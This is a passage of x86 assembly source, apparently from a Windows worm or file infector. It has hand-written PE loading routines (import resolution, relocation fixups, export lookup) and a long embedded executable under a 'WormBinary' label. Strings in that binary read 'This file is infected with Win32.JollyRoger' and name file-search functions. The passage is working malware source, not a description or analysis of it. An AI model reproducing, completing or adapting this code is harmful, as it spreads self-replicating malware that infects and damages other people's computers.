;we add the new handle to the end of the list of pehandles
mov dword ptr [eax.PEHANDLE.imported_dlls],edx
mov eax,edx

HandleOfImportedFound:

mov edx,eax
xchg edx,ebx

mov dword ptr [esp.Pushad_struc.Pushad_edx],edx
mov dword ptr [esp.Pushad_struc.Pushad_ebx],ebx

popad ;restoring regs with this information:
;esi-> array of pointers to names of imported functions
;edi-> array of pointers to destinations of VAs of imported functions
;edx-> MZ
;ebx-> pehandle of the loaded module

;now,we can resolve imports of this module

mov ebx,[ebx.PEHANDLE.base]

NextImportedFunction:

cmp dword ptr [esi],00000000h
jz EndImportingFunctions
push esi
mov esi,[esi]
add esi,edx
add esi,2
call PEGetProcAddr
pop esi
;eax->function
stosd
lodsd
jmp NextImportedFunction

EndImportingFunctions:

popad
popfd
ret
;;;;;;;;;;;;

;;;;;;;;;;;;
;eax->pehandle node
;the function will return a pointer to the last pehandle node
GoEndListOfPEhandles:
pushad
pushfd
xor edx,edx
SearchEndOfListOfPEhandles:
or eax,eax
jz EndOfListOfPEhandlesFound
mov edx,eax
mov eax,[eax.PEHANDLE.imported_dlls]
jmp SearchEndOfListOfPEhandles

EndOfListOfPEhandlesFound:
popfd
mov dword ptr [esp.Pushad_struc.Pushad_eax],edx
popad
ret
;;;;;;;;;;;;

;;;;;;;;;;;;
;esi->name of dll
;eax->first pehandle
;it will return a pointer to the found pehandle or null if not found
SearchDllHandleByName:
pushad
pushfd

ISearchDllHandleByName:
or eax,eax
jz HandleByModuleNameFound
mov ebx,[eax.PEHANDLE.base]
mov edx,[ebx+3ch]
add edx,ebx
mov edx,[edx.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
add edx,ebx
mov edi,[edx.IMAGE_EXPORT_DIRECTORY.ED_Name]
add edi,ebx
CompareString
or ecx,ecx
jz HandleByModuleNameFound
mov eax,[eax.PEHANDLE.imported_dlls]
jmp ISearchDllHandleByName

HandleByModuleNameFound:
popfd
mov dword ptr [esp.Pushad_struc.Pushad_eax],eax
popad
ret
;;;;;;;;;;;;

;;;;;;;;;;;;
;ebx ->MZ addr
;PE must be loaded in memory, in good associated RVAs.

ResolveRelocs:
pushad
pushfd
mov esi,ebx
add esi,dword ptr [ebx+3ch]
mov edx,ebx
sub edx,dword ptr [esi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_ImageBase] ;delta
mov esi,dword ptr [esi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_DirectoryEntries.DE_BaseReloc.DD_VirtualAddress]
or esi,esi
jz EndResolveRelocs
add esi,ebx

;esi->relocs
;ebx->current base
;edx->delta
ParseRelocations:
cmp dword ptr [esi],0
je EndResolveRelocs

mov ecx,dword ptr [esi+4]
sub ecx,8
shr ecx,1 ;ecx = n fixups

ParseFixUps:
mov ax,word ptr [esi+2*ecx+8-2]   ;parsing fixups from the last to the first one
push eax
and eax,00000FFFh			    ;eax = offset in the page of the point to relocate
mov edi,dword ptr [esi]
add edi,ebx
add edi,eax 			    ;real address for fixing up
pop eax
test eax,0000F000h
jz NoApplyThisFixUp
add dword ptr [edi],edx 	    ;adding delta
NoApplyThisFixUp:
loop ParseFixUps

add esi,[esi+4]
jmp ParseRelocations

EndResolveRelocs:

popfd
popad
ret
;;;;;;;;;;;;

;;;;;;;;;;;;
;ebx->MZ hdr
;esi->name of the exported function
;PE must be loaded in memory
PEGetProcAddr:
pushad
pushfd

mov edi,[ebx+3ch]
add edi,ebx
mov edi,dword ptr [edi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
add edi,ebx

;edi->IMAGE_EXPORT_DIRECTORY

mov ecx,[edi.IMAGE_EXPORT_DIRECTORY.ED_NumberOfNames]
mov edx,[edi.IMAGE_EXPORT_DIRECTORY.ED_AddressOfNames]
add edx,ebx

;edx->array of pointers to functions names

SearchFunctionName:
push edi
push ecx
mov  edi,[edx+ecx*4-4]
add  edi,ebx
CompareString
mov  eax,ecx
pop  ecx
pop  edi
or   eax,eax
jz   EndSearchFunctionName
loop SearchFunctionName
EndSearchFunctionName:
or ecx,ecx
jz EndPEGetProcAddrErr

;ecx = index in the table of pointers to functions names

mov edx,[edi.IMAGE_EXPORT_DIRECTORY.ED_AddressOfNameOrdinals]
add edx,ebx
mov ax,word ptr [edx+ecx*2-2];ax = ordinal
mov edx,[edi.IMAGE_EXPORT_DIRECTORY.ED_AddressOfFunctions]
add edx,ebx
mov eax,[edx+eax*4] ;eax = addr of the function
add eax,ebx

EndPEGetProcAddrNoErr:
popfd
mov dword ptr [esp.Pushad_struc.Pushad_eax],eax
popad
ret

EndPEGetProcAddrErr:
popfd
popad
xor eax,eax
ret
;;;;;;;;;;;;

WormBinaryAddr:
call WormBinaryAddr2
WormBinaryAddr2:
pop eax
ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

WormBinary:
db 04dh, 05ah, 090h, 000h, 003h, 000h, 000h, 000h, 004h, 000h, 000h, 000h, 0ffh, 0ffh
db 000h, 000h, 0b8h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 040h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 0b8h, 000h, 000h, 000h, 00eh, 01fh, 0bah, 00eh, 000h, 0b4h
db 009h, 0cdh, 021h, 0b8h, 001h, 04ch, 0cdh, 021h, 054h, 068h, 069h, 073h, 020h, 070h
db 072h, 06fh, 067h, 072h, 061h, 06dh, 020h, 063h, 061h, 06eh, 06eh, 06fh, 074h, 020h
db 062h, 065h, 020h, 072h, 075h, 06eh, 020h, 069h, 06eh, 020h, 044h, 04fh, 053h, 020h
db 06dh, 06fh, 064h, 065h, 02eh, 00dh, 00dh, 00ah, 024h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 059h, 05ah, 01dh, 0deh, 01dh, 03bh, 073h, 08dh, 01dh, 03bh, 073h, 08dh
db 01dh, 03bh, 073h, 08dh, 0e2h, 01bh, 076h, 08dh, 01ch, 03bh, 073h, 08dh, 01bh, 018h
db 079h, 08dh, 01ah, 03bh, 073h, 08dh, 0e2h, 01bh, 077h, 08dh, 01ch, 03bh, 073h, 08dh
db 052h, 069h, 063h, 068h, 01dh, 03bh, 073h, 08dh, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 050h, 045h, 000h, 000h, 04ch, 001h, 002h, 000h, 005h, 09ch, 0c5h, 041h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 0e0h, 000h, 00eh, 021h, 00bh, 001h
db 006h, 000h, 000h, 03eh, 000h, 000h, 000h, 004h, 000h, 000h, 000h, 000h, 000h, 000h
db 0beh, 049h, 000h, 000h, 000h, 010h, 000h, 000h, 000h, 050h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 010h, 000h, 000h, 000h, 002h, 000h, 000h, 004h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 004h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 060h
db 000h, 000h, 000h, 002h, 000h, 000h, 000h, 000h, 000h, 000h, 002h, 000h, 000h, 000h
db 000h, 000h, 010h, 000h, 000h, 010h, 000h, 000h, 000h, 000h, 010h, 000h, 000h, 010h
db 000h, 000h, 000h, 000h, 000h, 000h, 010h, 000h, 000h, 000h, 040h, 04dh, 000h, 000h
db 03ch, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 050h, 000h, 000h, 038h, 002h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 02eh, 074h
db 065h, 078h, 074h, 000h, 000h, 000h, 07ch, 03dh, 000h, 000h, 000h, 010h, 000h, 000h
db 000h, 03eh, 000h, 000h, 000h, 002h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 020h, 000h, 000h, 0e0h, 02eh, 072h, 065h, 06ch
db 06fh, 063h, 000h, 000h, 0b2h, 002h, 000h, 000h, 000h, 050h, 000h, 000h, 000h, 004h
db 000h, 000h, 000h, 040h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 040h, 000h, 000h, 042h, 0c8h, 050h, 000h, 000h, 060h, 08bh
db 07dh, 024h, 0fch, 081h, 065h, 010h, 0efh, 000h, 000h, 000h, 075h, 007h, 0c7h, 045h
db 010h, 001h, 000h, 000h, 000h, 081h, 065h, 014h, 0efh, 000h, 000h, 000h, 075h, 007h
db 0c7h, 045h, 014h, 001h, 000h, 000h, 000h, 081h, 065h, 00ch, 0ffh, 0ffh, 01fh, 000h
db 075h, 007h, 0c7h, 045h, 00ch, 040h, 000h, 000h, 000h, 08bh, 0c7h, 02bh, 045h, 024h
db 08bh, 04dh, 018h, 089h, 001h, 083h, 0c0h, 010h, 03bh, 045h, 020h, 073h, 00ch, 0ffh
db 04dh, 01ch, 07ch, 007h, 0e8h, 005h, 000h, 000h, 000h, 0ebh, 0e2h, 061h, 0c9h, 0c3h
db 0c7h, 045h, 0fch, 001h, 000h, 000h, 000h, 0c7h, 045h, 0f8h, 008h, 000h, 000h, 000h
db 0e8h, 0e4h, 003h, 000h, 000h, 089h, 045h, 0c8h, 0c1h, 0e0h, 003h, 089h, 045h, 0c4h
db 0e8h, 0d1h, 003h, 000h, 000h, 089h, 045h, 0c0h, 0c1h, 0e0h, 003h, 089h, 045h, 0bch
db 08bh, 045h, 014h, 023h, 045h, 010h, 0a9h, 00fh, 000h, 000h, 000h, 074h, 013h, 0b8h
db 002h, 000h, 000h, 000h, 0e8h, 093h, 003h, 000h, 000h, 089h, 045h, 0fch, 0c1h, 0e0h
db 003h, 089h, 045h, 0f8h, 0b8h, 002h, 000h, 000h, 000h, 0e8h, 080h, 003h, 000h, 000h
db 089h, 045h, 0dch, 0d1h, 0e0h, 089h, 045h, 0d8h, 0c1h, 0e0h, 002h, 089h, 045h, 0d4h
db 0b8h, 004h, 000h, 000h, 000h, 0e8h, 068h, 003h, 000h, 000h, 0c1h, 0e0h, 003h, 089h
db 045h, 0d0h, 0e8h, 070h, 003h, 000h, 000h, 0c1h, 0e0h, 003h, 089h, 045h, 0cch, 0e8h
db 070h, 003h, 000h, 000h, 089h, 045h, 0f4h, 0c1h, 0e0h, 003h, 089h, 045h, 0e4h, 0e8h
db 062h, 003h, 000h, 000h, 089h, 045h, 0ech, 0e8h, 05fh, 003h, 000h, 000h, 089h, 045h
db 0f0h, 0c1h, 0e0h, 003h, 089h, 045h, 0e0h, 0e8h, 051h, 003h, 000h, 000h, 089h, 045h
db 0e8h, 0e8h, 04eh, 003h, 000h, 000h, 089h, 045h, 0b8h, 0c1h, 0e0h, 003h, 089h, 045h
db 0b4h, 0e8h, 040h, 003h, 000h, 000h, 089h, 045h, 0b0h, 0b8h, 01fh, 000h, 000h, 000h
db 0e8h, 00bh, 003h, 000h, 000h, 096h, 046h, 08bh, 055h, 00ch, 08bh, 045h, 0fch, 0d1h
db 0eah, 073h, 00eh, 04eh, 00fh, 084h, 027h, 001h, 000h, 000h, 04eh, 00fh, 084h, 02dh
db 001h, 000h, 000h, 0d1h, 0eah, 073h, 00eh, 04eh, 00fh, 084h, 02fh, 001h, 000h, 000h
db 04eh, 00fh, 084h, 036h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h, 04eh, 00fh, 084h
db 032h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h, 04eh, 00fh, 084h, 047h, 001h, 000h
db 000h, 0d1h, 0eah, 073h, 007h, 04eh, 00fh, 084h, 041h, 001h, 000h, 000h, 0d1h, 0eah
db 073h, 00eh, 04eh, 00fh, 084h, 044h, 001h, 000h, 000h, 04eh, 00fh, 084h, 045h, 001h
db 000h, 000h, 0d1h, 0eah, 073h, 00eh, 04eh, 00fh, 084h, 042h, 001h, 000h, 000h, 04eh
db 00fh, 084h, 04ch, 001h, 000h, 000h, 0d1h, 0eah, 073h, 00eh, 04eh, 00fh, 084h, 059h
db 001h, 000h, 000h, 04eh, 00fh, 084h, 05fh, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h
db 04eh, 00fh, 084h, 05eh, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h, 04eh, 00fh, 084h
db 060h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h, 04eh, 00fh, 084h, 062h, 001h, 000h
db 000h, 0d1h, 0eah, 073h, 00eh, 04eh, 00fh, 084h, 065h, 001h, 000h, 000h, 04eh, 00fh
db 084h, 06eh, 001h, 000h, 000h, 0d1h, 0eah, 073h, 00eh, 04eh, 00fh, 084h, 070h, 001h
db 000h, 000h, 04eh, 00fh, 084h, 079h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 00eh, 04eh
db 00fh, 084h, 07fh, 001h, 000h, 000h, 04eh, 00fh, 084h, 097h, 001h, 000h, 000h, 0d1h
db 0eah, 073h, 007h, 04eh, 00fh, 084h, 0a4h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h
db 04eh, 00fh, 084h, 0a0h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h, 04eh, 00fh, 084h
db 0a3h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 00eh, 04eh, 00fh, 084h, 0a6h, 001h, 000h
db 000h, 04eh, 00fh, 084h, 0b0h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h, 04eh, 00fh
db 084h, 0b0h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 00eh, 04eh, 00fh, 084h, 0b7h, 001h
db 000h, 000h, 04eh, 00fh, 084h, 0b7h, 001h, 000h, 000h, 0d1h, 0eah, 073h, 007h, 04eh
db 00fh, 084h, 0b3h, 001h, 000h, 000h, 0e9h, 0bch, 0feh, 0ffh, 0ffh, 00ch, 088h, 0aah
db 0b0h, 0c0h, 00bh, 045h, 0e4h, 00bh, 045h, 0f0h, 0aah, 0c3h, 00ch, 08ah, 0aah, 0b0h
db 0c0h, 00bh, 045h, 0e0h, 00bh, 045h, 0f4h, 0aah, 0c3h, 0b0h, 0b0h, 00bh, 045h, 0f8h
db 00bh, 045h, 0f0h, 0aah, 0e9h, 08dh, 001h, 000h, 000h, 00ch, 0c6h, 0aah, 0b0h, 0c0h
db 0ebh, 0f0h, 0b0h, 00fh, 0aah, 0b0h, 0b6h, 00bh, 045h, 0fch, 00bh, 045h, 0d4h, 0aah
db 0b0h, 0c0h, 00bh, 045h, 0c4h, 0ebh, 0d3h, 00ch, 086h, 0aah, 0b0h, 0c0h, 00bh, 045h
db 0e0h, 00bh, 045h, 0e8h, 0aah, 0c3h, 00ch, 086h, 0aah, 0ebh, 0f1h, 0b0h, 08dh, 0aah
db 0b0h, 005h, 00bh, 045h, 0c4h, 0aah, 0e9h, 059h, 001h, 000h, 000h, 00ch, 000h, 00bh
db 045h, 0cch, 0aah, 0ebh, 099h, 00ch, 002h, 00bh, 045h, 0cch, 0aah, 0ebh, 09eh, 00ch
db 080h, 0aah, 0b0h, 0c0h, 00bh, 045h, 0cch, 00bh, 045h, 0f0h, 0aah, 0e9h, 032h, 001h
db 000h, 000h, 0f7h, 045h, 014h, 001h, 000h, 000h, 000h, 00fh, 084h, 02ch, 0feh, 0ffh
db 0ffh, 00ch, 004h, 00bh, 045h, 0cch, 0aah, 0e9h, 01ah, 001h, 000h, 000h, 00ch, 0feh
db 0aah, 0b0h, 0c0h, 00bh, 045h, 0d4h, 0e9h, 060h, 0ffh, 0ffh, 0ffh, 0b0h, 040h, 00bh
db 045h, 0d4h, 00bh, 045h, 0c8h, 0aah, 0c3h, 00ch, 0f6h, 0aah, 0b0h, 0d0h, 00bh, 045h
db 0d4h, 0e9h, 049h, 0ffh, 0ffh, 0ffh, 00ch, 084h, 0aah, 0b0h, 0c0h, 00bh, 045h, 0b4h
db 00bh, 045h, 0b0h, 0aah, 0c3h, 00ch, 0f6h, 0aah, 0b0h, 0c0h, 00bh, 045h, 0b8h, 0aah
db 0e9h, 0dbh, 000h, 000h, 000h, 0b0h, 00fh, 0aah, 0b0h, 0afh, 0aah, 0b0h, 0c0h, 00bh
db 045h, 0c4h, 00bh, 045h, 0c0h, 0aah, 0c3h, 0b0h, 069h, 0aah, 0e8h, 0eeh, 0ffh, 0ffh
db 0ffh, 0e9h, 0c4h, 000h, 000h, 000h, 00ch, 0d0h, 00bh, 045h, 0d8h, 0aah, 0b0h, 0c0h
db 00bh, 045h, 0cch, 00bh, 045h, 0f0h, 0aah, 0c3h, 00ch, 0c0h, 0aah, 0b0h, 0c0h, 00bh
db 045h, 0cch, 00bh, 045h, 0f0h, 0aah, 0e9h, 0adh, 000h, 000h, 000h, 0b0h, 00fh, 0aah
db 0b0h, 0a4h, 00bh, 045h, 0d4h, 0aah, 0b0h, 0c0h, 0e8h, 005h, 000h, 000h, 000h, 0e9h
db 098h, 000h, 000h, 000h, 0b0h, 0c0h, 00bh, 045h, 0bch, 00bh, 045h, 0c8h, 0aah, 0c3h
db 0f7h, 045h, 010h, 002h, 000h, 000h, 000h, 00fh, 084h, 078h, 0fdh, 0ffh, 0ffh, 0b0h
db 00fh, 0aah, 0b0h, 0a5h, 00bh, 045h, 0d4h, 0aah, 0ebh, 0deh, 0b0h, 00fh, 0aah, 0b0h
db 0c8h, 0ebh, 0dch, 0b0h, 00fh, 0aah, 0b0h, 0c0h, 00bh, 045h, 0fch, 0aah, 0e9h, 0e1h
db 0feh, 0ffh, 0ffh, 0b0h, 00fh, 0aah, 0b0h, 0bch, 00bh, 045h, 0dch, 0aah, 0e9h, 06eh
db 0ffh, 0ffh, 0ffh, 0b0h, 00fh, 0aah, 0b0h, 0bah, 0aah, 0b0h, 0e0h, 00bh, 045h, 0d0h
db 00bh, 045h, 0c8h, 0aah, 0ebh, 042h, 0b0h, 00fh, 0aah, 0b0h, 0a3h, 00bh, 045h, 0d0h
db 0aah, 0ebh, 09fh, 066h, 0b8h, 0ebh, 001h, 066h, 0abh, 0b8h, 000h, 001h, 000h, 000h
db 0e8h, 033h, 000h, 000h, 000h, 0aah, 0c3h, 0b0h, 026h, 00bh, 045h, 0d0h, 0aah, 0c3h
db 0b0h, 064h, 00bh, 045h, 0dch, 0aah, 0c3h, 0b0h, 0f2h, 00bh, 045h, 0dch, 0aah, 0c3h
db 083h, 07dh, 0fch, 000h, 074h, 00ah, 0e8h, 000h, 000h, 000h, 000h, 0e8h, 000h, 000h
db 000h, 000h, 0b8h, 000h, 001h, 000h, 000h, 0e8h, 002h, 000h, 000h, 000h, 0aah, 0c3h
db 060h, 050h, 0ffh, 075h, 008h, 0ffh, 055h, 028h, 083h, 0c4h, 008h, 089h, 044h, 024h
db 01ch, 061h, 00bh, 0c0h, 0c3h, 0b8h, 008h, 000h, 000h, 000h, 0e8h, 0e3h, 0ffh, 0ffh
db 0ffh, 0c3h, 08bh, 055h, 010h, 0ebh, 00dh, 08bh, 055h, 014h, 0ebh, 008h, 08bh, 055h
db 010h, 00bh, 055h, 014h, 0ebh, 000h, 0e8h, 0deh, 0ffh, 0ffh, 0ffh, 08bh, 0c8h, 083h
db 07dh, 0fch, 000h, 075h, 003h, 083h, 0e1h, 003h, 00fh, 0a3h, 0cah, 073h, 0ebh, 0c3h
db 072h, 02bh, 062h, 000h, 046h, 069h, 06eh, 064h, 043h, 06ch, 06fh, 073h, 065h, 000h
db 000h, 000h, 046h, 069h, 06eh, 064h, 04eh, 065h, 078h, 074h, 046h, 069h, 06ch, 065h
db 041h, 000h, 000h, 000h, 046h, 069h, 06eh, 064h, 046h, 069h, 072h, 073h, 074h, 046h
db 069h, 06ch, 065h, 041h, 000h, 000h, 06bh, 065h, 072h, 06eh, 065h, 06ch, 033h, 032h
db 02eh, 064h, 06ch, 06ch, 000h, 000h, 000h, 000h, 047h, 065h, 074h, 043h, 075h, 072h
db 072h, 065h, 06eh, 074h, 044h, 069h, 072h, 065h, 063h, 074h, 06fh, 072h, 079h, 041h
db 000h, 000h, 000h, 000h, 073h, 072h, 061h, 06eh, 064h, 000h, 000h, 000h, 072h, 061h
db 06eh, 064h, 000h, 000h, 000h, 000h, 048h, 065h, 061h, 070h, 044h, 065h, 073h, 074h
db 072h, 06fh, 079h, 000h, 048h, 065h, 061h, 070h, 041h, 06ch, 06ch, 06fh, 063h, 000h
db 000h, 000h, 048h, 065h, 061h, 070h, 043h, 072h, 065h, 061h, 074h, 065h, 000h, 000h
db 048h, 065h, 061h, 070h, 046h, 072h, 065h, 065h, 000h, 000h, 000h, 000h, 071h, 073h
db 06fh, 072h, 074h, 000h, 000h, 000h, 066h, 072h, 065h, 065h, 000h, 000h, 000h, 000h
db 063h, 061h, 06ch, 06ch, 06fh, 063h, 000h, 000h, 066h, 074h, 065h, 06ch, 06ch, 000h
db 000h, 000h, 066h, 073h, 065h, 065h, 06bh, 000h, 000h, 000h, 066h, 077h, 072h, 069h
db 074h, 065h, 000h, 000h, 066h, 072h, 065h, 061h, 064h, 000h, 000h, 000h, 066h, 063h
db 06ch, 06fh, 073h, 065h, 000h, 000h, 066h, 06fh, 070h, 065h, 06eh, 000h, 000h, 000h
db 047h, 065h, 074h, 054h, 069h, 063h, 06bh, 043h, 06fh, 075h, 06eh, 074h, 000h, 000h
db 000h, 000h, 046h, 072h, 065h, 065h, 04ch, 069h, 062h, 072h, 061h, 072h, 079h, 000h
db 06dh, 073h, 076h, 063h, 072h, 074h, 02eh, 064h, 06ch, 06ch, 000h, 000h, 054h, 068h
db 069h, 073h, 020h, 066h, 069h, 06ch, 065h, 020h, 069h, 073h, 020h, 069h, 06eh, 066h
db 065h, 063h, 074h, 065h, 064h, 020h, 077h, 069h, 074h, 068h, 020h, 057h, 069h, 06eh
db 033h, 032h, 02eh, 04ah, 06fh, 06ch, 06ch, 079h, 052h, 06fh, 067h, 065h, 072h, 00ah
db 020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h, 020h, 061h, 039h, 032h, 02fh
db 05ah, 065h, 06ch, 06ch, 061h, 056h, 020h, 079h, 042h, 020h, 064h, 045h, 064h, 06fh
db 043h, 000h, 000h, 000h, 057h, 069h, 06eh, 033h, 032h, 02eh, 04ah, 06fh, 06ch, 06ch
db 079h, 052h, 06fh, 067h, 065h, 072h, 000h, 000h, 000h, 000h, 04dh, 065h, 073h, 073h
db 061h, 067h, 065h, 042h, 06fh, 078h, 041h, 000h, 075h, 073h, 065h, 072h, 033h, 032h
db 02eh, 064h, 06ch, 06ch, 000h, 000h, 055h, 08bh, 0ech, 083h, 0ech, 040h, 053h, 056h
db 057h, 06ah, 014h, 058h, 033h, 0f6h, 089h, 045h, 0ech, 089h, 045h, 0f8h, 08bh, 045h
db 00ch, 089h, 075h, 0f4h, 03dh, 0a5h, 000h, 000h, 000h, 089h, 075h, 0e8h, 08dh, 0b8h
db 05bh, 0ffh, 0ffh, 0ffh, 00fh, 082h, 05eh, 002h, 000h, 000h, 03bh, 0feh, 074h, 050h
db 08dh, 047h, 0ffh, 050h, 056h, 0e8h, 0b8h, 032h, 000h, 000h, 059h, 02bh, 0f8h, 059h
db 089h, 045h, 0f4h, 074h, 03dh, 08dh, 047h, 0ffh, 050h, 056h, 0e8h, 0a5h, 032h, 000h
db 000h, 059h, 02bh, 0f8h, 059h, 089h, 045h, 0e8h, 074h, 02ah, 08dh, 047h, 0ffh, 050h
db 056h, 0e8h, 092h, 032h, 000h, 000h, 02bh, 0f8h, 059h, 08dh, 040h, 014h, 059h, 089h
db 045h, 0ech, 074h, 014h, 08dh, 047h, 0ffh, 050h, 056h, 0e8h, 07ch, 032h, 000h, 000h
db 02bh, 0f8h, 059h, 083h, 0c0h, 014h, 059h, 089h, 045h, 0f8h, 083h, 0c7h, 078h, 06ah
db 007h, 056h, 089h, 07dh, 0f0h, 0e8h, 0b2h, 032h, 000h, 000h, 059h, 089h, 045h, 00ch
db 059h, 06ah, 004h, 05fh, 03bh, 0c7h, 075h, 00fh, 06ah, 007h, 056h, 0e8h, 09eh, 032h
db 000h, 000h, 059h, 089h, 045h, 00ch, 059h, 0ebh, 0edh, 06ah, 007h, 056h, 0e8h, 08fh
db 032h, 000h, 000h, 03bh, 045h, 00ch, 059h, 059h, 089h, 045h, 0fch, 074h, 0eeh, 03bh
db 0c7h, 074h, 0eah, 050h, 0e8h, 08ch, 01ch, 000h, 000h, 0ffh, 075h, 00ch, 08bh, 0d8h
db 0e8h, 082h, 01ch, 000h, 000h, 057h, 00bh, 0d8h, 0e8h, 07ah, 01ch, 000h, 000h, 0ffh
db 075h, 0f4h, 08bh, 07dh, 008h, 00bh, 0d8h, 057h, 053h, 0ffh, 075h, 0fch, 0ffh, 075h
db 00ch, 056h, 06ah, 007h, 0e8h, 0fch, 00bh, 000h, 000h, 08bh, 04dh, 0e8h, 08bh, 0f0h
db 08bh, 045h, 0ech, 0c6h, 004h, 03eh, 0e8h, 083h, 064h, 03eh, 001h, 000h, 046h, 003h
db 0c1h, 083h, 0c6h, 004h, 050h, 08dh, 004h, 03eh, 050h, 053h, 0ffh, 075h, 0fch, 0ffh
db 075h, 00ch, 06ah, 000h, 06ah, 00ah, 0e8h, 0d0h, 00bh, 000h, 000h, 08bh, 04dh, 0f8h
db 003h, 0f0h, 083h, 0c4h, 044h, 089h, 04dh, 008h, 08dh, 014h, 03eh, 051h, 052h, 08bh
db 055h, 0f0h, 053h, 003h, 0d1h, 003h, 0d0h, 052h, 0ffh, 075h, 00ch, 06ah, 003h, 06ah
db 001h, 0e8h, 0abh, 00bh, 000h, 000h, 083h, 0c4h, 01ch, 003h, 0f0h, 03bh, 045h, 008h
db 089h, 045h, 0f8h, 074h, 052h, 089h, 045h, 0f4h, 073h, 04dh, 08bh, 04dh, 008h, 08dh
db 004h, 03eh, 02bh, 04dh, 0f4h, 051h, 050h, 053h, 0ffh, 075h, 0fch, 0ffh, 075h, 00ch
db 06ah, 000h, 06ah, 007h, 0e8h, 07eh, 00bh, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h
db 074h, 017h, 08bh, 04dh, 0f4h, 08bh, 055h, 0f8h, 08dh, 074h, 006h, 0ffh, 08dh, 04ch
db 001h, 0ffh, 08dh, 044h, 002h, 0ffh, 089h, 045h, 0f8h, 0ebh, 007h, 08bh, 04dh, 0f4h
db 0c6h, 004h, 03eh, 090h, 041h, 046h, 0ffh, 045h, 0f8h, 03bh, 04dh, 008h, 089h, 04dh
db 0f4h, 072h, 0b3h, 06ah, 014h, 058h, 089h, 045h, 008h, 089h, 045h, 0e8h, 08bh, 045h
db 0f0h, 083h, 0c0h, 088h, 085h, 0c0h, 089h, 045h, 0ech, 074h, 029h, 048h, 050h, 06ah
db 000h, 0e8h, 034h, 031h, 000h, 000h, 059h, 059h, 08bh, 04dh, 0ech, 02bh, 0c8h, 08dh
db 040h, 014h, 089h, 045h, 008h, 074h, 011h, 049h, 051h, 06ah, 000h, 0e8h, 01ch, 031h
db 000h, 000h, 059h, 083h, 0c0h, 014h, 059h, 089h, 045h, 0e8h, 08bh, 04dh, 00ch, 08bh
db 045h, 008h, 089h, 04dh, 0cch, 08bh, 04dh, 014h, 089h, 04dh, 0d0h, 089h, 045h, 0d8h
db 08dh, 04dh, 0c0h, 033h, 0c0h, 051h, 050h, 089h, 05dh, 0d4h, 089h, 045h, 0c0h, 0c7h
db 045h, 0c4h, 002h, 000h, 000h, 000h, 0c7h, 045h, 0c8h, 004h, 000h, 000h, 000h, 089h
db 045h, 0e0h, 089h, 045h, 0dch, 089h, 045h, 0e4h, 0e8h, 0a4h, 01ah, 000h, 000h, 089h
db 045h, 014h, 08bh, 045h, 0e8h, 089h, 045h, 0d8h, 08bh, 04dh, 00ch, 033h, 0c0h, 089h
db 05dh, 0d4h, 089h, 045h, 0c0h, 089h, 045h, 0e0h, 089h, 045h, 0dch, 089h, 045h, 0e4h
db 08dh, 045h, 0c0h, 089h, 04dh, 0cch, 050h, 0c7h, 045h, 0d0h, 004h, 000h, 000h, 000h
db 0ffh, 075h, 014h, 0c7h, 045h, 0c4h, 001h, 000h, 000h, 000h, 0c7h, 045h, 0c8h, 003h
db 000h, 000h, 000h, 0e8h, 063h, 01ah, 000h, 000h, 08dh, 004h, 03eh, 050h, 08bh, 045h
db 010h, 083h, 0c0h, 003h, 053h, 0c1h, 0e8h, 002h, 050h, 06ah, 003h, 0ffh, 075h, 0fch
